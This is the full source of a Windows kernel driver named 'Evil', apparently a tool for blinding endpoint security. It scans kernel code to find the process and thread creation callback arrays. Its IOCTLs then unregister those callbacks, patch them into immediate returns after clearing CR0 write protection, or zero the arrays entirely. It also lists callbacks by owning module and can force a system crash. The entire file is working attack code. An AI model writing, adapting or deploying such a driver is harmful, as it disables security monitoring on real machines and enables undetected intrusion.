#include <ntifs.h>
#include <ntddk.h>
#include <intrin.h>
#include <Aux_klib.h>
#include "Common.h"

#pragma intrinsic(__readmsr)

void EvilUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS EvilCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS EvilDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS EvilRead(_In_ PDEVICE_OBJECT, _In_ PIRP Irp);

KIRQL g_irql;
UCHAR g_ProcessStoreAddress[0x320]; //8 byte array * 64 process callbacks
UCHAR g_ThreadStoreAddress[0x320]; //8 byte array * 64 thread callbacks

void CR0_WP_OFF_x64()
{
	cr0 mycr0;
	mycr0.flags = __readcr0();
	mycr0.write_protect = 0;
	__writecr0(mycr0.flags);
}

void CR0_WP_ON_x64()
{
	cr0 mycr0;
	mycr0.flags = __readcr0();
	mycr0.write_protect = 1;
	__writecr0(mycr0.flags);
}

WINDOWS_INDEX getWindowsIndex()
{
	NTSTATUS status = STATUS_SUCCESS;
	OSVERSIONINFOEXW osVersionInfo;
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
	status = RtlGetVersion((POSVERSIONINFOW)&osVersionInfo);
	NT_ASSERT(NT_SUCCESS(status));

	switch (osVersionInfo.dwBuildNumber)
	{
	case 2600:
		return WindowsIndexXP;
		break;
	case 3790:
		return WindowsIndex2K3;
		break;
	case 6000:
	case 6001:
	case 6002:
		return WindowsIndexVISTA;
		break;
	case 7600:
	case 7601:
		return WindowsIndexWIN7;
		break;
	case 8102:
	case 8250:
	case 9200:
		return WindowsIndexWIN8;
	case 9431:
	case 9600:
		return WindowsIndexWIN81;
		break;
	case 10240:
		return WindowsIndexWIN10_1507;
		break;
	case 10586:
		return WindowsIndexWIN10_1511;
		break;
	case 14393:
		return WindowsIndexWIN10_1607;
		break;
	case 15063:
		return WindowsIndexWIN10_1703;
		break;
	case 16299:
		return WindowsIndexWIN10_1709;
		break;
	case 17134:
		return WindowsIndexWIN10_1803;
		break;
	case 17763:
		return WindowsIndexWIN10_1809;
		break;
	case 18362:
		return WindowsIndexWIN10_1903;
		break;
	case 18363:
		return WindowsIndexWIN10_1909;
		break;
	case 19041:
		return WindowsIndexWIN10_2004;
		break;
	default:
		return WindowsIndexUNSUPPORTED;
	}
}

WINDOWS_INDEX g_WindowsIndex;

ULONG64 FindPspCreateProcessNotifyRoutine()
{
	LONG OffsetAddr = 0;
	ULONG64	i = 0;
	ULONG64 pCheckArea = 0;
	UNICODE_STRING unstrFunc;

	RtlInitUnicodeString(&unstrFunc, L"PsSetCreateProcessNotifyRoutine");
	pCheckArea = (ULONG64)MmGetSystemRoutineAddress(&unstrFunc);
	KdPrint(("[+] PsSetCreateProcessNotifyRoutine is at address: %llx \n", pCheckArea));

	for (i = pCheckArea; i < pCheckArea + 20; i++)
	{
		if ((*(PUCHAR)i == OPCODE_PSP[g_WindowsIndex]))
		{
			OffsetAddr = 0;
			memcpy(&OffsetAddr, (PUCHAR)(i + 1), 4);
			pCheckArea = pCheckArea + (i - pCheckArea) + OffsetAddr + 5;
			break;
		}
	}

	KdPrint(("[+] PspSetCreateProcessNotifyRoutine is at address: %llx \n", pCheckArea));

	for (i = pCheckArea; i < pCheckArea + 0xff; i++)
	{
		if (*(PUCHAR)i == OPCODE_LEA_R13_1[g_WindowsIndex] && *(PUCHAR)(i + 1) == OPCODE_LEA_R13_2[g_WindowsIndex] && *(PUCHAR)(i + 2) == OPCODE_LEA_R13_3[g_WindowsIndex])
		{
			OffsetAddr = 0;
			memcpy(&OffsetAddr, (PUCHAR)(i + 3), 4);
			return OffsetAddr + 7 + i;
		}
	}
	return 0;
}

ULONG64 FindPsSetCreateThreadNotifyRoutine()
{
	LONG OffsetAddr = 0;
	ULONG64	i = 0;
	ULONG64 pCheckArea = 0;
	UNICODE_STRING unstrFunc;

	RtlInitUnicodeString(&unstrFunc, L"PsSetCreateThreadNotifyRoutine");
	pCheckArea = (ULONG64)MmGetSystemRoutineAddress(&unstrFunc);
	KdPrint(("[+] PsSetCreateThreadNotifyRoutine is at address: %llx \n", pCheckArea));

	for (i = pCheckArea; i < pCheckArea + 20; i++)
	{
		if ((*(PUCHAR)i == OPCODE_PSP[g_WindowsIndex]))
		{
			OffsetAddr = 0;
			memcpy(&OffsetAddr, (PUCHAR)(i + 1), 4);
			pCheckArea = pCheckArea + (i - pCheckArea) + OffsetAddr + 5;
			break;
		}
	}

	KdPrint(("[+] PspSetCreateThreadNotifyRoutine is at address: %llx \n", pCheckArea));

	for (i = pCheckArea; i < pCheckArea + 0xff; i++)
	{	

		if (*(PUCHAR)i == OPCODE_LEA_RCX_1[g_WindowsIndex] && *(PUCHAR)(i + 1) == OPCODE_LEA_RCX_2[g_WindowsIndex] && *(PUCHAR)(i + 2) == OPCODE_LEA_RCX_3[g_WindowsIndex])
		{
			OffsetAddr = 0;
			memcpy(&OffsetAddr, (PUCHAR)(i + 3), 4);
			return OffsetAddr + 7 + i;
		}
	}
	return 0;
}

extern "C" NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	KdPrint(("[+] %s Driver says hello.\n", DRIVER_NAME));
	g_WindowsIndex = getWindowsIndex();

	DriverObject->DriverUnload = EvilUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = EvilCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = EvilCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = EvilDeviceControl;
	DriverObject->MajorFunction[IRP_MJ_READ] = EvilRead;

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\Evil");

	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		KdPrint(("[-] Evil Driver: Failed to create device (0x%08X)\n", status));
		return status;
	}

	DeviceObject->Flags |= DO_BUFFERED_IO;

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Evil");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("[-] Evil Driver: Failed to create symbolic link (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	KdPrint(("[+] %s Driver DriverEntry has completed.\n", DRIVER_NAME));

	return STATUS_SUCCESS;
}

void EvilUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Evil");

	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint(("[+] %s Driver has been Unloaded.\n", DRIVER_NAME));
}

_Use_decl_annotations_
NTSTATUS EvilCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS DisplayModules()
{
	auto status = STATUS_SUCCESS;
	ULONG  modulesSize;
	AUX_MODULE_EXTENDED_INFO* modules;
	ULONG  numberOfModules, i;

	status = AuxKlibInitialize();
	if (!NT_SUCCESS(status))
	{
		KdPrint(("AuxKlibInitialize fail %d\n", status));
		return status;
	}

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);
	if (!NT_SUCCESS(status) || modulesSize == 0) {
		return status;
	}

	numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
	if (modules == NULL) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		return status;
	}
	RtlZeroMemory(modules, modulesSize);

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
	if (!NT_SUCCESS(status)) {
		ExFreePoolWithTag(modules, DRIVER_TAG);
		return status;
	}

	KdPrint(("[ # ] ImageBase\t\t\tImageSize\t\t\t\t\t\t  FileName  FullPathName\n"));
	for (i = 0; i < numberOfModules; i++)
	{
		KdPrint(("[%03d] %p\t", i, modules[i].BasicInfo.ImageBase));
		KdPrint(("0x%08x\t", modules[i].ImageSize));
		KdPrint(("%30s ", modules[i].FullPathName + modules[i].FileNameOffset));
		KdPrint((" %s\n", modules[i].FullPathName));
	}

	ExFreePoolWithTag(modules, DRIVER_TAG);

	return status;
}

_Use_decl_annotations_
NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_EVIL_LIST_MODULES:
	{
		DisplayModules();
		break;
	}
	case IOCTL_EVIL_PROCESS_DELETE_CALLBACK:
	{
		ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();

		if (!PspCreateProcessNotifyRoutine)
			return STATUS_SUCCESS;

		int i = 0;
		ULONG64	NotifyAddr = 0, MagicPtr = 0;

		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		for (i = 0; i < 64; i++)
		{
			MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
			NotifyAddr = *(PULONG64)(MagicPtr);
			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			{
				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));

				if (data->index == i)
				{
					status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)NotifyAddr, TRUE);
					if (NT_SUCCESS(status))
						KdPrint((DRIVER_PREFIX "Callback Removed!\n"));
					else
						KdPrint((DRIVER_PREFIX "Callback Remove Failed!\n"));
					break;
				}
			}
		}
		break;
	}

	case IOCTL_EVIL_THREAD_DELETE_CALLBACK:
	{
		ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();

		if (!PspCreateThreadNotifyRoutine)
			return STATUS_SUCCESS;

		int i = 0;
		ULONG64	NotifyAddr = 0, MagicPtr = 0;

		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		for (i = 0; i < 64; i++)
		{
			MagicPtr = PspCreateThreadNotifyRoutine + i * 8;
			NotifyAddr = *(PULONG64)(MagicPtr);
			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			{
				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				KdPrint(("[%d] CreateThreadNotifyRoutine: %llx \n", i, NotifyAddr));

				if (data->index == i)
				{
					status = PsRemoveCreateThreadNotifyRoutine((PCREATE_THREAD_NOTIFY_ROUTINE)(NotifyAddr));
					if (NT_SUCCESS(status))
						KdPrint((DRIVER_PREFIX "Callback Removed!\n"));
					else
						KdPrint((DRIVER_PREFIX "Callback Remove Failed!\n"));
					break;
				}
			}
		}
		break;
	}

	case IOCTL_EVIL_PROCESS_CALLBACK_RET:
	{
		ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();

		if (!PspCreateProcessNotifyRoutine)
			return STATUS_SUCCESS;

		int i = 0;
		ULONG64	NotifyAddr = 0, MagicPtr = 0;

		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		for (i = 0; i < 64; i++)
		{
			MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
			NotifyAddr = *(PULONG64)(MagicPtr);
			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			{
				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));

				if (data->index == i)
				{
					int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);

					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					{
						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						CR0_WP_OFF_x64();
						KeRevertToUserAffinityThreadEx(oldAffinity);
					}

					PULONG64 pPointer = (PULONG64)NotifyAddr;
					memcpy((g_ProcessStoreAddress + i * 8), pPointer, 8);
					*pPointer = (ULONG64)0xc3;

					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					{
						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						CR0_WP_ON_x64();
						KeRevertToUserAffinityThreadEx(oldAffinity);
					}
					break;
				}
			}
		}
		break;
	}

	case IOCTL_EVIL_THREAD_CALLBACK_RET:
	{
		ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();

		if (!PspCreateThreadNotifyRoutine)
			return STATUS_SUCCESS;

		int i = 0;
		ULONG64	NotifyAddr = 0, MagicPtr = 0;

		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		for (i = 0; i < 64; i++)
		{
			MagicPtr = PspCreateThreadNotifyRoutine + i * 8;
			NotifyAddr = *(PULONG64)(MagicPtr);
			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			{
				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				KdPrint(("[%d] CreateThreadNotifyRoutine: %llx \n", i, NotifyAddr));

				if (data->index == i)
				{
					int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);

					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					{
						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						CR0_WP_OFF_x64();
						KeRevertToUserAffinityThreadEx(oldAffinity);
					}

					PULONG64 pPointer = (PULONG64)NotifyAddr;
					memcpy((g_ThreadStoreAddress + i * 8), pPointer, 8);
					*pPointer = (ULONG64)0xc3;

					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					{
						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						CR0_WP_ON_x64();
						KeRevertToUserAffinityThreadEx(oldAffinity);
					}
					break;
				}
			}
		}
		break;
	}

	case IOCTL_EVIL_PROCESS_ROLLBACK_RET:
	{
		ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();

		if (!PspCreateProcessNotifyRoutine)
			return STATUS_SUCCESS;

		int i = 0;
		ULONG64	NotifyAddr = 0, MagicPtr = 0;

		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		for (i = 0; i < 64; i++)
		{
			MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
			NotifyAddr = *(PULONG64)(MagicPtr);
			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			{
				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));

				if (data->index == i)
				{
					int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);

					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					{
						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						CR0_WP_OFF_x64();
						KeRevertToUserAffinityThreadEx(oldAffinity);
					}

					PULONG64 pPointer = (PULONG64)NotifyAddr;
					memcpy(pPointer,(g_ProcessStoreAddress + i * 8),8);

					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					{
						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						CR0_WP_ON_x64();
						KeRevertToUserAffinityThreadEx(oldAffinity);
					}
					break;
				}
			}
		}
		break;
	}

	case IOCTL_EVIL_THREAD_ROLLBACK_RET:
	{
		ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();

		if (!PspCreateThreadNotifyRoutine)
			return STATUS_SUCCESS;

		int i = 0;
		ULONG64	NotifyAddr = 0, MagicPtr = 0;

		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		for (i = 0; i < 64; i++)
		{
			MagicPtr = PspCreateThreadNotifyRoutine + i * 8;
			NotifyAddr = *(PULONG64)(MagicPtr);
			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			{
				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				KdPrint(("[%d] CreateThreadNotifyRoutine: %llx \n", i, NotifyAddr));

				if (data->index == i)
				{
					int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);

					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					{
						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						CR0_WP_OFF_x64();
						KeRevertToUserAffinityThreadEx(oldAffinity);
					}

					PULONG64 pPointer = (PULONG64)NotifyAddr;
					memcpy(pPointer, (g_ThreadStoreAddress + i * 8), 8);

					for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					{
						KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						CR0_WP_ON_x64();
						KeRevertToUserAffinityThreadEx(oldAffinity);
					}
					break;
				}
			}
		}
		break;
	}

	case IOCTL_EVIL_PROCESS_ZEROOUT_ARRAY:
	{
		ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();

		if (!PspCreateProcessNotifyRoutine)
			return STATUS_SUCCESS;

		int i = 0;
		ULONG64	NotifyAddr = 0, MagicPtr = 0;

		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		for (i = 0; i < 64; i++)
		{
			MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
			NotifyAddr = *(PULONG64)(MagicPtr);
			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			{
				if (data->list)
				{
					NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
					KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));
				}

				if (data->remove)
					*(PULONG64)(MagicPtr) = 0;
			}
		}

		break;
	}

	case IOCTL_EVIL_THREAD_ZEROOUT_ARRAY:
	{
		ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();

		if (!PspCreateThreadNotifyRoutine)
			return STATUS_SUCCESS;

		int i = 0;
		ULONG64	NotifyAddr = 0, MagicPtr = 0;

		auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		for (i = 0; i < 64; i++)
		{
			MagicPtr = PspCreateThreadNotifyRoutine + i * 8;
			NotifyAddr = *(PULONG64)(MagicPtr);
			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			{
				if (data->list)
				{
					NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
					KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));
				}

				if (data->remove)
					*(PULONG64)(MagicPtr) = 0;
			}
		}

		break;
	}

	case IOCTL_EVIL_BSOD:
	{
		KeBugCheck(0xDEADDEAD);
		break;
	}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS SearchModules(ULONG64 ModuleAddr, ModulesData* ModuleFound)
{
	auto status = STATUS_SUCCESS;
	ULONG  modulesSize;
	AUX_MODULE_EXTENDED_INFO* modules;
	ULONG  numberOfModules, i;

	ModulesData ModuleFound2 = *ModuleFound;

	status = AuxKlibInitialize();
	if (!NT_SUCCESS(status))
	{
		KdPrint(("AuxKlibInitialize fail %d\n", status));
		return status;
	}

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);
	if (!NT_SUCCESS(status) || modulesSize == 0) {
		return status;
	}

	numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
	if (modules == NULL) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		return status;
	}
	RtlZeroMemory(modules, modulesSize);

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
	if (!NT_SUCCESS(status)) {
		ExFreePoolWithTag(modules, DRIVER_TAG);
		return status;
	}

	for (i = 0; i < numberOfModules; i++)
	{
		if (ModuleAddr > (ULONG64)modules[i].BasicInfo.ImageBase && ModuleAddr < ((ULONG64)modules[i].BasicInfo.ImageBase + modules[i].ImageSize))
		{
			KdPrint(("Found: %s\n", modules[i].FullPathName + modules[i].FileNameOffset));

			strcpy(ModuleFound2.ModuleName, (CHAR*)(modules[i].FullPathName + modules[i].FileNameOffset));
			ModuleFound2.ModuleBase = (ULONG64)modules[i].BasicInfo.ImageBase;

			*ModuleFound = ModuleFound2;
			ExFreePoolWithTag(modules, DRIVER_TAG);
			return status;
		}
	}

	ExFreePoolWithTag(modules, DRIVER_TAG);

	return status;
}

// This is the most hackish code ever written, don't look
NTSTATUS EvilRead(PDEVICE_OBJECT, PIRP Irp) {
	auto status = STATUS_SUCCESS;
	auto count = 0;

	ModulesData ModuleFound;
	ModuleFound.ModuleBase = 0;
	::memset(ModuleFound.ModuleName, 0, sizeof(ModuleFound.ModuleName));

	auto buffer = (UCHAR*)Irp->AssociatedIrp.SystemBuffer;
	if (!buffer) {
		status = STATUS_INSUFFICIENT_RESOURCES;
	}
	else {
		ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
		ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();

		if (!PspCreateProcessNotifyRoutine & !PspCreateThreadNotifyRoutine)
			return STATUS_SUCCESS;

		ULONG64 i = 0;
		ULONG64	NotifyAddr = 0, MagicPtr = 0;
		ULONG64	NotifyAddr2 = 0, MagicPtr2 = 0;

		for (i = 0; i < 64; i++)
		{
			MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
			NotifyAddr = *(PULONG64)(MagicPtr);
			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			{
				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));
				count += 16;
				::memcpy(buffer, (ULONG64*)&i, 8);
				buffer += 8;
				::memcpy(buffer, (ULONG64*)&NotifyAddr, 8);
				buffer += 8;

				SearchModules(NotifyAddr, &ModuleFound);
				if (ModuleFound.ModuleBase != 0)
				{
					::memcpy(buffer, ModuleFound.ModuleName, sizeof(ModuleFound.ModuleName));
					buffer += 32;

					ModuleFound.ModuleBase = NotifyAddr - ModuleFound.ModuleBase;

					::memcpy(buffer, (ULONG64*)&ModuleFound.ModuleBase, 8);
					buffer += 8;

					count = count + 8 + 32;
				}
				else
				{
					count += 16;
					::memcpy(buffer, ModuleFound.ModuleName, 8);
					buffer += 8;
					::memset(buffer, 0, 8);
					buffer += 8;
				}
			}
		}


		for (i = 0; i < 64; i++)

		{
			MagicPtr2 = PspCreateThreadNotifyRoutine + i * 8;
			NotifyAddr2 = *(PULONG64)(MagicPtr2);
			if (MmIsAddressValid((PVOID)NotifyAddr2) && NotifyAddr2 != 0)
			{
				NotifyAddr2 = *(PULONG64)(NotifyAddr2 & 0xfffffffffffffff8);
				KdPrint(("[%d] CreateThreadNotifyRoutine: %llx \n", i, NotifyAddr2));
				count += 16;
				::memcpy(buffer, (ULONG64*)&i, 8);
				buffer += 8;
				::memcpy(buffer, (ULONG64*)&NotifyAddr2, 8);
				buffer += 8;

				SearchModules(NotifyAddr2, &ModuleFound);
				if (ModuleFound.ModuleBase != 0)
				{
					::memcpy(buffer, ModuleFound.ModuleName, sizeof(ModuleFound.ModuleName));
					buffer += 32;

					ModuleFound.ModuleBase = NotifyAddr2 - ModuleFound.ModuleBase;

					::memcpy(buffer, (ULONG64*)&ModuleFound.ModuleBase, 8);
					buffer += 8;

					count = count + 8 + 32;
				}
				else
				{
					count += 16;
					::memcpy(buffer, ModuleFound.ModuleName, 8);
					buffer += 8;
					::memset(buffer, 0, 8);
					buffer += 8;
				}
			}
		}

	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = count;
	IoCompleteRequest(Irp, 0);
	return status;
}
